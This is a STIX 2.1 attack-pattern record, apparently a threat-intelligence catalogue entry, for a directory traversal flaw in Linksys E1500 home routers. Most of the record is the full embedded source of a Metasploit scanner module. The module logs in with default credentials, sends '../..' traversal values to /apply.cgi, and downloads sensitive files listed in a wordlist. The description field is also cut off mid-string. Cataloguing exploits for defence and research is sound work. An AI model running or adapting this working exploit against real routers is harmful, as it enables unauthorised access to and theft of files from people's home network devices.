{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--2b1cdd65-c25f-4a85-8379-1f0977751c08",
    "created": "2024-08-14T16:29:51.630523Z",
    "modified": "2024-08-14T16:29:51.630527Z",
    "name": "Linksys E1500 Directory Traversal Vulnerability",
    "description": " This module exploits a directory traversal vulnerability which is present in different Linksys home routers, like the E1500.  'References'  => [",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/linksys_e1500_traversal.rb",
            "external_id": "linksys_e1500_traversal.rb"
        },
        {
            "source_name": "reference",
            "url": "http://homekb.cisco.com/Cisco2/ukp.aspx?pid=80&app=vw&vw=1&login=1&json=1&docid=d7d0a87be9864e20bc347a73f194411f_KB_EN_v1.xml"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Scanner\n\n  def initialize\n    super(\n      'Name'        => 'Linksys E1500 Directory Traversal Vulnerability',\n      'Description' => %q{\n          This module exploits a directory traversal vulnerability which is present in\n        different Linksys home routers, like the E1500.\n      },\n      'References'  =>\n        [\n          [ 'URL', 'http://www.s3cur1ty.de/m1adv2013-004' ],\n          [ 'URL', 'http://homekb.cisco.com/Cisco2/ukp.aspx?pid=80&app=vw&vw=1&login=1&json=1&docid=d7d0a87be9864e20bc347a73f194411f_KB_EN_v1.xml' ],\n          [ 'BID', '57760' ],\n          [ 'OSVDB', '89911' ],\n          [ 'EDB', '24475' ]\n        ],\n      'Author'      => [ 'Michael Messner <devnull[at]s3cur1ty.de>' ],\n      'License'     => MSF_LICENSE\n    )\n\n    register_options(\n      [\n        OptPath.new('SENSITIVE_FILES',  [ true, \"File containing senstive files, one per line\",\n          File.join(Msf::Config.data_directory, \"wordlists\", \"sensitive_files.txt\") ]),\n        OptString.new('HttpUsername',[ true, 'User to login with', 'admin']),\n        OptString.new('HttpPassword',[ true, 'Password to login with', 'password']),\n\n      ])\n  end\n\n  def extract_words(wordfile)\n    return [] unless wordfile && File.readable?(wordfile)\n\n    begin\n      File.readlines(wordfile, chomp: true)\n    rescue ::StandardError => e\n      elog(e)\n      []\n    end\n  end\n\n  def find_files(file,user,pass)\n    uri = \"/apply.cgi\"\n    traversal = '../..'\n    data_trav = \"submit_type=wsc_method2&change_action=gozila_cgi&next_page=\" << traversal << file\n    res = send_request_cgi({\n      'method'  => 'POST',\n      'uri'     => uri,\n      'authorization' => basic_auth(user,pass),\n      'vars_post' => {\n        \"submit_type\" => \"wsc_method2\",\n        \"change_action\" => \"gozila_cgi\",\n        \"next_page\" => traversal << file\n      }\n    })\n\n    # without res.body.length we get lots of false positives\n    if (res and res.code == 200 and res.body.length > 0)\n      print_good(\"#{rhost}:#{rport} - Request may have succeeded on file #{file}\")\n      report_web_vuln({\n          :host => rhost,\n          :port => rport,\n          :vhost => datastore['VHOST'],\n          :path => uri,\n          :pname => data_trav,\n          :risk => 3,\n          :proof => data_trav,\n          :name => self.fullname,\n          :category => \"web\",\n          :method => \"POST\"\n      })\n\n      loot = store_loot(\"linksys.traversal.data\",\"text/plain\", rhost, res.body, file)\n      vprint_good(\"#{rhost}:#{rport} - File #{file} downloaded to: #{loot}\")\n    elsif (res and res.code)\n      vprint_error(\"#{rhost}:#{rport} - Attempt returned HTTP error #{res.code} when trying to access #{file}\")\n    end\n  end\n\n  def run_host(ip)\n    user = datastore['HttpUsername']\n    pass = datastore['HttpPassword']\n\n    vprint_status(\"#{rhost}:#{rport} - Trying to login with #{user} / #{pass}\")\n\n    # test login\n    begin\n      res = send_request_cgi({\n        'uri' => '/',\n        'method' => 'GET',\n        'authorization' => basic_auth(user,pass)\n      })\n\n      return if res.nil?\n      return if (res.headers['Server'].nil? or res.headers['Server'] !~ /httpd/)\n      return if (res.code == 404)\n\n      if [200, 301, 302].include?(res.code)\n        vprint_good(\"#{rhost}:#{rport} - Successful login #{user}/#{pass}\")\n      else\n        vprint_error(\"#{rhost}:#{rport} - No successful login possible with #{user}/#{pass}\")\n        return\n      end\n\n    rescue ::Rex::ConnectionError\n      vprint_error(\"#{rhost}:#{rport} - Failed to connect to the web server\")\n      return\n    end\n\n    extract_words(datastore['SENSITIVE_FILES']).each do |file|\n      find_files(file, user, pass) unless file.empty?\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        "[ Michael Messner <devnull[at]s3cur1ty.de> ]",
        ""
    ]
}